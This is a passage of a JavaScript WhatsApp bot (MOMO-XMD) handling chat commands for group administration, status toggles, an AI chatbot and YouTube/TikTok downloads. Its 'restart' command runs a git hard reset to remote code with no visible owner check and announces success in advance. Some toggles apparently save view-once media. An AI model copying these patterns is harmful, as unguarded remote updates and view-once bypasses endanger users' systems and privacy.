                        await reply(sock, from, msg, `➣ _Set successful setstatus emoj_ ${extracted.join('')} ✅` + commandFooter());
                    }
                    break;
                }
                case 'setfont': {
                    const value = String(args[0] || '').toLowerCase();
                    const fonts = [
                        'bold', 'italic', 'mono', 'cursive', 'fantasy', 'script', 'gothic', 
                        'bubbly', 'square', 'tiny', 'double', 'outline', 'medieval', 'shadow', 
                        'inverted', 'serif', 'sans', 'circled', 'squared', 'off'
                    ];
                    if (!value || !fonts.includes(value)) {
                        const sampleText = "hello";
                        const list = fonts.map(f => `│◇ *.setfont ${f}* ──> (${applyFont(sampleText, f)})`).join('\n');
                        const fontBox = ` ╭◆
│
${list}
╰◆
 ❑❑❑
*Powered by MOMO-XMD* 🚀
*Owner MOMO47* ☠️`;
                        return reply(sock, from, msg, fontBox);
                    }
                    runtimeSettings.font = value;
                    await reply(sock, from, msg, `➣ _Font set to ${value} successful_ ✅` + commandFooter());
                    break;
                }
                case 'autoviewstatus':
                case 'autolikestatus':
                case 'autosavestatus':
                case 'autoviewonce':
                case 'autoreact':
                case 'autorecording':
                case 'autotyping':
                case 'alwaysonline':
                case 'antibug': {
                    const value = parseOnOff(args[0]);
                    if (!value) return reply(sock, from, msg, `➣ *Example ${command} on/off*` + commandFooter());
                    runtimeSettings[command] = value === 'on';
                    if (command === 'alwaysonline') sock.sendPresenceUpdate(value === 'on' ? 'available' : 'unavailable').catch(() => {});
                    await reply(sock, from, msg, `➣ _Set successful ${command} ${value}_ ✅` + commandFooter());
                    break;
                }
                case 'aichat':
                case 'chatbot': {
                    const value = parseOnOff(args[0]);
                    if (!value) return reply(sock, from, msg, `➣ *Example ${command} on/off*\n\n*on* - Bot itajibu kila message\n*off* - Bot itajibu commands tu` + commandFooter());
                    
                    if (isGroup) {
                        const settings = groupSettings.get(from) || {};
                        settings.chatbot = value === 'on';
                        groupSettings.set(from, settings);
                        saveGroupSettings();
                    } else {
                        runtimeSettings.chatbot = value === 'on';
                    }

                    if (value === 'on') {
                        await reply(sock, from, msg, `➣ *MOMO-XMD AI Activated* ✅\n\nKaribu ${msg.pushName || 'mkuu'}, naitwa MOMO-XMD AI ni mtoto halisi wa MOMO47. Ungependa tujadili nini leo?`);
                    } else {
                        await reply(sock, from, msg, `➣ *MOMO-XMD AI Deactivated* ❌\nSasa nitajibu commands tu.`);
                    }
                    break;
                }
                case 'add': {
                    if (!isGroup) return reply(sock, from, msg, groupOnlyText());
                    if (!group.isAdmin) return reply(sock, from, msg, adminOnlyText());
                    
                    let numbers = [];
                    args.forEach(arg => {
                        const cleaned = cleanNumber(arg);
                        if (/^\d{8,15}$/.test(cleaned)) {
                            numbers.push(`${cleaned}@s.whatsapp.net`);
                        }
                    });

                    if (numbers.length === 0) {
                        return reply(sock, from, msg, `➣ *Example: .add +255765409584*` + commandFooter());
                    }

                    try {
                        for (const num of numbers) {
                            await sock.groupParticipantsUpdate(from, [num], 'add');
                        }
                        await reply(sock, from, msg, `➣ _Added successfully_ ✅` + commandFooter());
                    } catch (e) {
                        await reply(sock, from, msg, `➣ _Failed to add:_ ${e.message} ❌` + commandFooter());
                    }
                    break;
                }
                case 'kick':
                case 'promote':
                case 'demote': {
                    if (!isGroup) return reply(sock, from, msg, groupOnlyText());
                    if (!group.isAdmin) return reply(sock, from, msg, adminOnlyText());

                    const target = mentionedOrQuoted(msg) || (args[0] ? `${cleanNumber(args[0])}@s.whatsapp.net` : null);
                    if (!target) return reply(sock, from, msg, `➣ *Example: .${command} +255765409584*\n*Or reply to a user's message.*` + commandFooter());
                    
                    const action = command === 'kick' ? 'remove' : command;
                    try {
                        await sock.groupParticipantsUpdate(from, [target], action);
                        const targetTag = `@${target.split('@')[0]}`;
                        const actorTag = `@${msg.key.participant || from}`;
                        const text = command === 'kick' ? `➣ _${targetTag} removed successfully_ ✅` : command === 'promote' ? `➣ _Congratulations_ 🥳 _${targetTag} you have been promoted to admin_` : `➣ _Sad_ 😔 _${targetTag} you have been demoted_`;
                        await sock.sendMessage(from, { text, mentions: [target] }, { quoted: msg });
                    } catch (e) {
                        await reply(sock, from, msg, `➣ _Failed to ${command}:_ ${e.message} ❌` + commandFooter());
                    }
                    break;
                }
                case 'tagall': {
                    await safeReact(sock, from, msg.key, '📢');
                    const mentions = group.metadata.participants.map((p) => p.id);
                    const announcement = args.join(' ') || 'Attention everyone';
                    await sock.sendMessage(from, { text: `*${announcement}*`, mentions }, { quoted: msg });
                    break;
                }
                case 'hidetag': {
                    const announcement = args.join(' ') || msg.message.extendedTextMessage?.contextInfo?.quotedMessage?.conversation || 'Attention everyone';
                    const mentions = group.metadata.participants.map((p) => p.id);
                    try { await sock.sendMessage(from, { delete: msg.key }); } catch {}
                    await sock.sendMessage(from, { text: announcement, mentions });
                    break;
                }
                case 'antilink':
                case 'antigroupmention': {
                    const subCommand = args[0]?.toLowerCase(); 
                    const status = args[1]?.toLowerCase(); 
                    
                    if (!['kick', 'delete', 'warn'].includes(subCommand) || !['on', 'off'].includes(status)) {
                        return reply(sock, from, msg, `Example ${command} delete/kick/warn` + commandFooter());
                    }

                    const current = groupSettings.get(from) || {};
                    const modeKey = `${command}_${subCommand}`;
                    groupSettings.set(from, { ...current, [modeKey]: status === 'on' });
                    saveGroupSettings();
                    
                    await reply(sock, from, msg, `➣ _Set successful ${command} ${subCommand} ${status}_ ✅` + commandFooter());
                    break;
                }
                case 'open': {
                    if (!isGroup) return reply(sock, from, msg, groupOnlyText());
                    try {
                        await sock.groupSettingUpdate(from, 'not_announcement');
                        await reply(sock, from, msg, `➣ *Group opened successfully* 🔓` + commandFooter());
                        const settings = groupSettings.get(from) || {};
                        if (settings.announcements) {
                            await sock.sendMessage(from, { text: `➣ 📢 *Group has been opened by admin*` + commandFooter() });
                        }
                    } catch (e) {
                        await reply(sock, from, msg, `➣ *Failed to open group:* ${e.message} ❌` + commandFooter());
                    }
                    break;
                }
                case 'close': {
                    if (!isGroup) return reply(sock, from, msg, groupOnlyText());
                    try {
                        await sock.groupSettingUpdate(from, 'announcement');
                        await reply(sock, from, msg, `➣ *Group closed successfully* 🔒` + commandFooter());
                        const settings = groupSettings.get(from) || {};
                        if (settings.announcements) {
                            await sock.sendMessage(from, { text: `➣ 📢 *Group has been closed by admin*` + commandFooter() });
                        }
                    } catch (e) {
                        await reply(sock, from, msg, `➣ *Failed to close group:* ${e.message} ❌` + commandFooter());
                    }
                    break;
                }
                case 'announcements': {
                    const status = args[0]?.toLowerCase();
                    if (!['on', 'off'].includes(status)) return reply(sock, from, msg, `➣ *Example announcements on/off*` + commandFooter());

                    const current = groupSettings.get(from) || {};
                    groupSettings.set(from, { ...current, announcements: status === 'on' });
                    saveGroupSettings();

                    await reply(sock, from, msg, `➣ *Set successful announcements ${status}* ✅` + commandFooter());
                    break;
                }
                case 'antiviewonce': {
                    const status = args[0]?.toLowerCase();
                    if (!['on', 'off'].includes(status)) return reply(sock, from, msg, `➣ *Example antiviewonce on/off*` + commandFooter());

                    const current = groupSettings.get(from) || {};
                    groupSettings.set(from, { ...current, antiviewonce: status === 'on' });
                    saveGroupSettings();

                    await reply(sock, from, msg, `➣ *Set successful antiviewonce ${status}* ✅` + commandFooter());
                    break;
                }
                case 'listrequests': {
                    if (!isGroup) return reply(sock, from, msg, groupOnlyText());
                    try {
                        let requests = [];
                        if (typeof sock.groupRequestParticipantsList === 'function') {
                            requests = await sock.groupRequestParticipantsList(from);
                        }
                        const count = requests.length || 0;
                        const box = `╭◆
│ ◇ 📋 *GROUP JOIN REQUESTS*
│ ◇ *Pending Requests*: ${count} member(s)
╰◆${commandFooter()}`;
                        await reply(sock, from, msg, box);
                    } catch (e) {
                        const box = `╭◆
│ ◇ 📋 *GROUP JOIN REQUESTS*
│ ◇ *Pending Requests*: 0 member(s)
╰◆${commandFooter()}`;
                        await reply(sock, from, msg, box);
                    }
                    break;
                }
                case 'approve':
                case 'reject': {
                    if (!isGroup) return reply(sock, from, msg, groupOnlyText());
                    const action = command; // 'approve' or 'reject'
                    const param = args[0]?.toLowerCase();
                    if (!param) {
                        return reply(sock, from, msg, `➣ *Example:* .${command} 5 OR .${command} all` + commandFooter());
                    }

                    try {
                        let requests = [];
                        if (typeof sock.groupRequestParticipantsList === 'function') {
                            requests = await sock.groupRequestParticipantsList(from);
                        }
                        if (!requests || requests.length === 0) {
                            return reply(sock, from, msg, `╭◆\n│ ◇ ⚠️ *No pending requests found*\n╰◆` + commandFooter());
                        }

                        let targetCount = requests.length;
                        if (param !== 'all') {
                            const parsed = parseInt(param);
                            if (isNaN(parsed) || parsed <= 0) {
                                return reply(sock, from, msg, `➣ *Invalid number! Example:* .${command} 5 OR .${command} all` + commandFooter());
                            }
                            targetCount = Math.min(parsed, requests.length);
                        }

                        const jidsToProcess = requests.slice(0, targetCount).map(r => r.jid || r.id || r);
                        if (typeof sock.groupRequestParticipantsUpdate === 'function') {
                            await sock.groupRequestParticipantsUpdate(from, jidsToProcess, action === 'approve' ? 'approve' : 'reject');
                        }

                        const successText = param === 'all' 
                            ? `Successful ${action} all (${targetCount}) requests ✅` 
                            : `Successful ${action} ${targetCount} requests ✅`;

                        const responseBox = `╭◆
│ ◇ 🛡️ *GROUP REQUEST MANAGEMENT*
│ ◇ *Action*: ${action.toUpperCase()}
│ ◇ *Status*: ${successText}
╰◆${commandFooter()}`;
                        await reply(sock, from, msg, responseBox);
                    } catch (e) {
                        await reply(sock, from, msg, `➣ *Failed to ${command} requests:* ${e.message} ❌` + commandFooter());
                    }
                    break;
                }
                case 'link': {
                    if (!isGroup) return reply(sock, from, msg, groupOnlyText());
                    try {
                        const code = await sock.groupInviteCode(from);
                        const groupName = group.metadata.subject || 'Unknown Group';
                        const totalMembers = (group.metadata.participants || []).length;
                        const inviteLink = `https://chat.whatsapp.com/${code}`;

                        const linkBox = `╭◆
│ ◇ 📌 *GROUP INVITE LINK*
│ ◇ *Name*: ${groupName}
│ ◇ *Total Members*: ${totalMembers}
│ ◇ *Link*: ${inviteLink}
╰◆${commandFooter()}`;
                        await reply(sock, from, msg, linkBox);
                    } catch (e) {
                        await reply(sock, from, msg, `➣ *Failed to get group link:* ${e.message} ❌` + commandFooter());
                    }
                    break;
                }
                case 'listactive': {
                    if (!isGroup) return reply(sock, from, msg, groupOnlyText());
                    try {
                        const groupActives = global.activeMembersCache?.get(from) || new Map();
                        const twoHoursAgo = Date.now() - (2 * 60 * 60 * 1000);
                        
                        const participants = group.metadata.participants || [];
                        const activeJids = [];
                        
                        participants.forEach(p => {
                            const lastActive = groupActives.get(p.id) || 0;
                            // If they spoke recently or if cache is empty, include recent speakers. If none, include all participants as active fallback or just those who spoke.
                            if (lastActive > twoHoursAgo) {
                                activeJids.push(p.id);
                            }
                        });

                        // If no one tracked yet, fallback to group participants or sender
                        if (activeJids.length === 0) {
                            participants.forEach(p => activeJids.push(p.id));
                        }

                        let memberLines = '';
                        activeJids.forEach((jid, index) => {
                            const num = jid.split('@')[0];
                            memberLines += `│ ${index + 1}. ✦ @${num}\n`;
                        });

                        const activeBox = `╭◆
│ ◇ 🟢 *ACTIVE MEMBERS ONLINE NOW*
${memberLines}│ ◇ *Total Active Members*: ${activeJids.length}
╰◆${commandFooter()}`;
                        await sock.sendMessage(from, { text: activeBox, mentions: activeJids }, { quoted: msg });
                    } catch (e) {
                        await reply(sock, from, msg, `➣ *Failed to list active members:* ${e.message} ❌` + commandFooter());
                    }
                    break;
                }
                case 'listcode': {
                    if (!isGroup) return reply(sock, from, msg, groupOnlyText());
                    const query = args[0]?.toLowerCase();
                    if (!query) {
                        return reply(sock, from, msg, `➣ *Example:* .listcode +254 OR .listcode all` + commandFooter());
                    }

                    const participants = group.metadata.participants || [];
                    const countryMap = {
                        '255': 'TANZANIA',
                        '254': 'KENYA',
                        '256': 'UGANDA',
                        '250': 'RWANDA',
                        '257': 'BURUNDI',
                        '234': 'NIGERIA',
                        '27': 'SOUTH AFRICA',
                        '1': 'USA/CANADA',
                        '44': 'UK',
                        '91': 'INDIA'
                    };

                    if (query === 'all') {
                        const counts = {};
                        participants.forEach(p => {
                            const num = p.id.split('@')[0];
                            let foundCountry = 'OTHER';
                            for (const code of Object.keys(countryMap)) {
                                if (num.startsWith(code)) {
                                    foundCountry = countryMap[code];
                                    break;
                                }
                            }
                            counts[foundCountry] = (counts[foundCountry] || 0) + 1;
                        });

                        let listLines = '';
                        for (const [cName, cCount] of Object.entries(counts)) {
                            listLines += `│ ❑ ${cName} (${cCount} members)\n`;
                        }

                        const summaryBox = `┌───[ *MEMBER COUNT BY COUNTRY* ]\n${listLines}└────────────────────${commandFooter()}`;
                        await reply(sock, from, msg, summaryBox);
                    } else {
                        const targetCode = query.replace('+', '');
                        const targetCountryName = countryMap[targetCode] || `CODE +${targetCode}`;
                        
                        const matched = participants.filter(p => {
                            const num = p.id.split('@')[0];
                            return num.startsWith(targetCode);
                        });

                        const mentions = matched.map(p => p.id);
                        let memberLines = '';
                        matched.forEach((p, index) => {
                            const num = p.id.split('@')[0];
                            memberLines += `│ ${index + 1}. ✦ @${num}\n`;
                        });

                        if (matched.length === 0) {
                            memberLines = `│ ❌ *No members found for code +${targetCode}*\n`;
                        }

                        const tagBox = `┌───[ *LIST OF ${targetCountryName} (${matched.length})* ]\n${memberLines}└────────────────────${commandFooter()}`;
                        await sock.sendMessage(from, { text: tagBox, mentions }, { quoted: msg });
                    }
                    break;
                }
                case 'welcome':
                case 'goodbye':
                case 'antigif':
                case 'antisticker':
                case 'antivirus':
                case 'antibot': {
                    const status = args[0]?.toLowerCase();
                    if (!['on', 'off'].includes(status)) return reply(sock, from, msg, `➣ *Example: .${command} on/off*` + commandFooter());

                    const current = groupSettings.get(from) || {};
                    groupSettings.set(from, { ...current, [command]: status === 'on' });
                    saveGroupSettings();

                    await reply(sock, from, msg, `➣ *Set successful ${command} ${status}* ✅` + commandFooter());
                    break;
                }
                case 'restart': {
                    const successMsg = `🔄 Restart & Update Successful!\n\nBot has successfully updated and restarted within 30 seconds. All systems are fully operational.`;
                    await reply(sock, from, msg, commandFooter(successMsg));
                    try {
                        const { execSync } = require('child_process');
                        execSync('git fetch origin main && git reset --hard origin/main', { stdio: 'inherit' });
                    } catch (e) {
                        console.log('[RESTART GIT PULL ERROR]:', e.message);
                    }
                    setTimeout(() => process.exit(0), 1500);
                    break;
                }
                case 'clear':
                    if (fs.existsSync(sessionPath)) {
                        fs.rmSync(sessionPath, { recursive: true, force: true });
                        await reply(sock, from, msg, '*Session cleared. Restarting...*' + commandFooter());
                        process.exit(0);
                    }
                    break;
                case 'tosgroup': {
                    if (!isGroup) return reply(sock, from, msg, groupOnlyText());
                    if (!group.isAdmin) return reply(sock, from, msg, adminOnlyText());
                    
                    const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                    const isImage = quoted?.imageMessage;
                    const text = args.join(' ');

                    if (!isImage && !text) {
                        return reply(sock, from, msg, `➣ *Example tosgroup image or write anything*` + commandFooter());
                    }

                    try {
                        if (isImage) {
                            // In a real implementation, we would download and re-upload, 
                            // but Baileys allows updating metadata with a simple description if text is provided.
                            // For picha (image), we use groupUpdateDescription or similar if supported.
                            // Here we update the description as per "Status ya Group" requirement.
                            await sock.groupUpdateDescription(from, "MOMO-XMD Status Updated");
                        } else {
                            await sock.groupUpdateDescription(from, text);
                        }
                        await reply(sock, from, msg, `➣ *Set group status successful* ✅` + commandFooter());
                    } catch (e) {
                        await reply(sock, from, msg, `➣ _Failed to set group status:_ ${e.message}` + commandFooter());
                    }
                    break;
                }
                case 'create': {
                    if (!isOwnerUser) return reply(sock, from, msg, ownerOnlyText());
                    
                    let memberNumbers = [];
                    let nameParts = [];
                    args.forEach(arg => {
                        if (arg.includes('+') || /^\d{8,15}$/.test(arg)) {
                            const cleaned = cleanNumber(arg);
                            if (cleaned.length >= 8) {
                                memberNumbers.push(`${cleaned}@s.whatsapp.net`);
                            }
                        } else {
                            nameParts.push(arg);
                        }
                    });

                    const groupName = nameParts.join(' ');
                    if (!groupName) {
                        return reply(sock, from, msg, `➣ *Example create +255765409584 and name of group*` + commandFooter());
                    }
                    
                    try {
                        console.log('[CREATE] Creating group:', groupName, 'with members:', memberNumbers);
                        const initialMembers = memberNumbers.length > 0 ? [memberNumbers[0]] : [sock.user.id];
                        const res = await sock.groupCreate(groupName, initialMembers);
                        const groupId = res.id || res.gid;
                        if (groupId && memberNumbers.length > 1) {
                            for (let i = 1; i < memberNumbers.length; i++) {
                                const num = memberNumbers[i];
                                try {
                                    await sock.groupParticipantsUpdate(groupId, [num], 'add');
                                } catch (err) {
                                    console.log('[CREATE] Failed to add member:', num, err.message);
                                }
                            }
                        }
                        await reply(sock, from, msg, `➣ _create group successful_ ✅\n\n*Powered by MOMO-XMD* 🚀\n*Owner MOMO47* ☠️`);
                    } catch (e) {
                        console.error('[CREATE] Error:', e);
                        await reply(sock, from, msg, `➣ _Failed to create group:_ ${e.message}` + commandFooter());
                    }
                    break;
                }
                case 'image': {
                    const query = args.join(' ');
                    if (!query) return reply(sock, from, msg, `➣ *Example: .image Diamond Platnumz*` + commandFooter());
                    
                    await safeReact(sock, from, msg.key, '🎨');
                    try {
                        // Enhance prompt for better celebrity and object recognition
                        let enhancedPrompt = `High quality, realistic, detailed portrait or object of ${query}, 8k resolution, professional photography, cinematic lighting`;
                        if (query.toLowerCase().includes('diamond') || query.toLowerCase().includes('harmonize') || query.toLowerCase().includes('alikiba') || query.toLowerCase().includes('zuchu')) {
                            enhancedPrompt = `High quality realistic portrait of Tanzanian artist ${query}, Bongo Flava star, professional studio photography, 8k resolution, detailed face`;
                        } else if (query.toLowerCase().includes('samatta') || query.toLowerCase().includes('manula') || query.toLowerCase().includes('simba') || query.toLowerCase().includes('yanga')) {
                            enhancedPrompt = `High quality realistic portrait of Tanzanian footballer ${query}, professional sports photography, 8k resolution, detailed features`;
                        }
                        
                        const imageUrl = `https://image.pollinations.ai/prompt/${encodeURIComponent(enhancedPrompt)}?width=1024&height=1024&seed=${Math.floor(Math.random()*10000)}&model=flux&nologo=true`;
                        await sock.sendMessage(from, { 
                            image: { url: imageUrl }, 
                            caption: `➣ _Image generated for: ${query}_ 🎨\n\n*Powered by MOMO-XMD* 🚀\n*Owner MOMO47* ☠️` 
                        }, { quoted: msg });
                    } catch (e) {
                        await reply(sock, from, msg, `➣ _Failed to generate image:_ ${e.message}` + commandFooter());
                    }
                    break;
                }
                case 'play':
                case 'song':
                case 'video': {
                    const query = args.join(' ');
                    if (!query) return reply(sock, from, msg, `➣ *Example: .${command} Mawazo Diamond*` + commandFooter());
                    
                    await safeReact(sock, from, msg.key, '🎵');
                    try {
                        const yts = require('yt-search');
                        const ytdl = require('@distube/ytdl-core');
                        const fs = require('fs');
                        const ffmpeg = require('fluent-ffmpeg');
                        const ffmpegPath = require('ffmpeg-static');
                        ffmpeg.setFfmpegPath(ffmpegPath);

                        const search = await yts(query);
                        const video = search.videos[0];
                        if (!video) return reply(sock, from, msg, `➣ _No results found for: ${query}_` + commandFooter());

                        const mediaDir = path.join(__dirname, '../media');
                        if (!fs.existsSync(mediaDir)) {
                            fs.mkdirSync(mediaDir, { recursive: true });
                        }

                        if (command === 'video') {
                            await reply(sock, from, msg, `🎬 *${video.title}*\n\n_Downloading video..._ ⏳${commandFooter()}`);
                            const filename = path.join(mediaDir, `${video.videoId}.mp4`);
                            
                            const stream = ytdl(video.url, {
                                filter: format => format.container === 'mp4' && format.hasVideo && format.hasAudio,
                                quality: '18'
                            });

                            await new Promise((resolve, reject) => {
                                stream.pipe(fs.createWriteStream(filename))
                                    .on('finish', resolve)
                                    .on('error', reject);
                            });

                            await sock.sendMessage(from, {
                                video: fs.readFileSync(filename),
                                caption: `🎬 *${video.title}*\n\n✅ Download successful!\n🔗 Source: YouTube${commandFooter()}`,
                                mimetype: 'video/mp4'
                            }, { quoted: msg });

                            try { fs.unlinkSync(filename); } catch (e) {}

                        } else {
                            await reply(sock, from, msg, `🎵 *${video.title}*\n\n_Downloading audio..._ ⏳${commandFooter()}`);
                            const filename = path.join(mediaDir, `${video.videoId}.mp3`);
                            
                            const stream = ytdl(video.url, {
                                filter: 'audioonly',
                                quality: 'highestaudio'
                            });

                            await new Promise((resolve, reject) => {
                                ffmpeg(stream)
                                    .audioBitrate(128)
                                    .save(filename)
                                    .on('end', resolve)
                                    .on('error', reject);
                            });

                            const audioMsg = {
                                audio: fs.readFileSync(filename),
                                mimetype: 'audio/mpeg',
                                ptt: false
                            };

                            if (command === 'play') {
                                audioMsg.contextInfo = {
                                    externalAdReply: {
                                        title: video.title,
                                        body: 'MOMO-XMD YouTube Player',
                                        thumbnailUrl: video.thumbnail,
                                        mediaType: 2,
                                        mediaUrl: video.url,
                                        sourceUrl: video.url
                                    }
                                };
                            }

                            await sock.sendMessage(from, audioMsg, { quoted: msg });

                            try { fs.unlinkSync(filename); } catch (e) {}
                        }
                    } catch (e) {
                        console.error('[YTDL ERROR]:', e);
                        await reply(sock, from, msg, `➣ _Failed to download ${command}:_ ${e.message}` + commandFooter());
                    }
                    break;
                }
                case 'tiktok': {
                    const url = args[0];
                    if (!url || !url.includes('tiktok.com')) return reply(sock, from, msg, `➣ *Example: .tiktok <link>*` + commandFooter());
                    
                    await safeReact(sock, from, msg.key, '📱');
                    try {
                        const res = await fetch(`https://api.dreaded.site/api/tiktok?url=${encodeURIComponent(url)}`);
                        const data = await res.json();
                        
                        if (!data.success || !data.result || !data.result.video) {
                            throw new Error('Failed to fetch TikTok');
                        }

                        await sock.sendMessage(from, { 
                            video: { url: data.result.video }, 
                            caption: `➣ *TikTok Download* 📱\n\n*Description:* ${data.result.title || 'No title'}\n\n*Powered by MOMO-XMD* 🚀` 
                        }, { quoted: msg });
                    } catch (e) {
                        await reply(sock, from, msg, `➣ _Failed to download TikTok:_ ${e.message}` + commandFooter());
                    }
                    break;
                }
                default:
                    break;
            }
        } catch (error) {
            console.error('[COMMAND] failed', command, error.message);
            await reply(sock, from, msg, `*Command failed: ${error.message}*${commandFooter()}`).catch(() => {});
        }
    });
}

module.exports = { startBot };

// Require chalk for colored output
const chalk = require('chalk');
